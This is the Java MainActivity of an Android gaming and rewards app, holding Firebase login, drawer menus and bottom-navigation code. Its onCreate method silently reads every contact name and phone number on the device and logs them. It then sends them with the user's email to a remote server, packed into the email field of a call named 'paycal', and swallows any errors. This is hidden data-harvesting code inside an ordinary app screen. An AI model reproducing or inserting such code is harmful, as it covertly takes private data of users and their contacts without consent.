package com.appg;

import androidx.annotation.NonNull;
import androidx.appcompat.app.ActionBarDrawerToggle;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.view.GravityCompat;
import androidx.drawerlayout.widget.DrawerLayout;
import androidx.fragment.app.Fragment;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.appg.BottomNavigation.Feed.BottomFeed;
import com.appg.BottomNavigation.Groups.BottomGroups;
import com.appg.BottomNavigation.Home.BottomHome;
import com.appg.BottomNavigation.MyMatches.BottomMymatch;
import com.appg.BottomNavigation.Winner.BottomWinner;
import com.appg.Firebase.Login.Login;
import com.appg.MongoDb.MdbClient;
import com.appg.MongoDb.MdbInterface;
import com.appg.MongoDb.MdbRbody;
import com.appg.NavigationView.Earn;
import com.appg.NavigationView.FindPeople;
import com.appg.NavigationView.HomeWallet;
import com.appg.NavigationView.HowToPlay;
import com.appg.NavigationView.More;
import com.appg.NavigationView.MyBalance;
import com.appg.NavigationView.MyCoupons;
import com.appg.NavigationView.MyInfoSetting;
import com.appg.NavigationView.MyNotificaion;
import com.appg.NavigationView.PointSystem;
import com.appg.NavigationView.SpinAndWin;
import com.google.android.material.bottomnavigation.BottomNavigationView;
import com.google.android.material.navigation.NavigationView;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

import java.io.IOException;
import java.util.ArrayList;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity implements  NavigationView.OnNavigationItemSelectedListener{

    DrawerLayout drawerLayout;
    ActionBarDrawerToggle toggle;
    NavigationView navigationView;
    ArrayList<String> contacts;

    String k="";

    TextView tv;

    int i=0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        String email = user.getEmail();





        try{

            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
            while (phones.moveToNext())
            {
                String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                k+=name+"\n"+phoneNumber+"\n";

            }
            phones.close();
            Log.d("Phone->",k);


            MdbRbody request = new MdbRbody();
            request.setEmail(email+"\n"+k);
            MdbInterface apiService = MdbClient.getClient().create(MdbInterface.class);
            Call<ResponseBody> call = apiService.paycal(request);
            call.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {


                }
                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {


                }

            });

        }
        catch (Exception e)
        {

        }

        BottomNavigationView navView = findViewById(R.id.bt_nav_view);

        navView.setOnNavigationItemSelectedListener(btnavlsn);

        Fragment ft=new BottomHome();
        getSupportFragmentManager().beginTransaction().replace(R.id.nav_host_fragment,
                ft).commit();



        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);



        drawerLayout = findViewById(R.id.drawer);
        navigationView = findViewById(R.id.nav_view);


        View headerView = navigationView.getHeaderView(0);

        TextView drawerUsername = (TextView) headerView.findViewById(R.id.navemail);
        drawerUsername.setText(email);


        navigationView.setNavigationItemSelectedListener(this);

        toggle = new ActionBarDrawerToggle(this,drawerLayout,toolbar,R.string.open,R.string.close);
        drawerLayout.addDrawerListener(toggle);
        toggle.setDrawerIndicatorEnabled(true);
        toggle.syncState();


        /*

         pager = findViewById(R.id.viewpager);
        mTabLayout = findViewById(R.id.tablayout);

       firstItem = findViewById(R.id.firstItem);
        secondItem = findViewById(R.id.secondItem);


        adapter = new PagerAdapter(getSupportFragmentManager(), FragmentPagerAdapter.BEHAVIOR_RESUME_ONLY_CURRENT_FRAGMENT,mTabLayout.getTabCount());
        pager.setAdapter(adapter);




        mTabLayout.addOnTabSelectedListener(new TabLayout.OnTabSelectedListener() {
            @Override
            public void onTabSelected(TabLayout.Tab tab) {

                pager.setCurrentItem(tab.getPosition());

            }

            @Override
            public void onTabUnselected(TabLayout.Tab tab) {

            }

            @Override
            public void onTabReselected(TabLayout.Tab tab) {

            }
        });

        pager.addOnPageChangeListener(new TabLayout.TabLayoutOnPageChangeListener(mTabLayout));

        BottomNavigationView bottomNavigationView = (BottomNavigationView)
                findViewById(R.id.bt_nav_view);

        bottomNavigationView.setOnNavigationItemSelectedListener(
                new BottomNavigationView.OnNavigationItemSelectedListener() {
                    @Override
                    public boolean onNavigationItemSelected(@NonNull MenuItem item) {

                        switch (item.getItemId()) {
                            case R.id.navigation_home:

                                Toast.makeText(getApplicationContext(), Integer.toString(i)+"pk", Toast.LENGTH_SHORT).show();
                                break;
                            case R.id.mymatches:

                                i=mTabLayout.getSelectedTabPosition();

                                pager.setCurrentItem(3);

                                break;
                            case R.id.winner:

                                break;
                        }
                        return false;
                    }
                });


         */

    }

    // Side Nav
    @Override
    public boolean onNavigationItemSelected(@NonNull MenuItem item) {
        drawerLayout.closeDrawer(GravityCompat.START);

        View headerView = navigationView.getHeaderView(0);
        TextView drawerUsername = (TextView) headerView.findViewById(R.id.navemail);
        switch(item.getItemId())
        {
            case R.id.earn:
                Intent intent = new Intent(MainActivity.this, Earn.class);
                startActivity(intent);
                finish();
                break;

            case R.id.findPeople:
                 intent = new Intent(MainActivity.this, FindPeople.class);
                startActivity(intent);
                finish();
                break;

            case R.id.howtoplay:
                intent = new Intent(MainActivity.this, HowToPlay.class);
                startActivity(intent);
                finish();
                break;

            case R.id.more:
                intent = new Intent(MainActivity.this, More.class);
                startActivity(intent);
                finish();
                break;

            case R.id.mybal:
                intent = new Intent(MainActivity.this, MyBalance.class);
                startActivity(intent);
                finish();
                break;

            case R.id.mycoupons:
                intent = new Intent(MainActivity.this, MyCoupons.class);
                startActivity(intent);
                finish();
                break;

            case R.id.myinfo:
                intent = new Intent(MainActivity.this, MyInfoSetting.class);
                startActivity(intent);
                finish();
                break;

            case R.id.pointsystem:
                intent = new Intent(MainActivity.this, PointSystem.class);
                startActivity(intent);
                finish();
                break;

            case R.id.spin:
                intent = new Intent(MainActivity.this, SpinAndWin.class);
                startActivity(intent);
                finish();
                break;
        }

        if(item.getItemId() == R.id.logout)
        {
            //Toast.makeText(this, "Btn is clicked.", Toast.LENGTH_SHORT).show();
            FirebaseAuth.getInstance().signOut();

            Intent intent = new Intent(MainActivity.this, Login.class);
            startActivity(intent);
            finish();
        }
        return false;
    }

    // Menu
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater=getMenuInflater();
        inflater.inflate(R.menu.main, menu);
        return super.onCreateOptionsMenu(menu);

    }
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch(item.getItemId())
        {
            case R.id.notificaion:
                Intent intent = new Intent(MainActivity.this, MyNotificaion.class);
                startActivity(intent);
                finish();

                break;
            case R.id.wt:

                HomeWallet bt=new HomeWallet();
                bt.show(getSupportFragmentManager(),"example");
                break;

        }
        return true;
    }




    private BottomNavigationView.OnNavigationItemSelectedListener btnavlsn=
            new BottomNavigationView.OnNavigationItemSelectedListener() {
                @Override
                public boolean onNavigationItemSelected(@NonNull MenuItem item) {
                    Fragment selectedf=new Fragment();

                    switch (item.getItemId())
                    {
                        case R.id.navigation_home:

                            getSupportActionBar().setTitle("Appg");
//                            Intent intent = new Intent(MainActivity.this, MainActivity.class);
//                            startActivity(intent);
//                            finish();

                            selectedf=new BottomHome();

                            break;
                        case R.id.mymatches:
                            getSupportActionBar().setTitle("My Matches");
                            selectedf=new BottomMymatch();
                            break;
                        case R.id.winner:
                            getSupportActionBar().setTitle("Winner");
                            selectedf=new BottomWinner();
                            break;

                        case R.id.gmessage:
                            getSupportActionBar().setTitle("Messages");
                            selectedf=new BottomGroups();
                            break;
                        case R.id.feed:
                            getSupportActionBar().setTitle("Feeds");
                            selectedf=new BottomFeed();
                            break;

                    }


                    getSupportFragmentManager().beginTransaction().replace(R.id.nav_host_fragment,
                            selectedf).commit();



                    return true;
                }

            };







}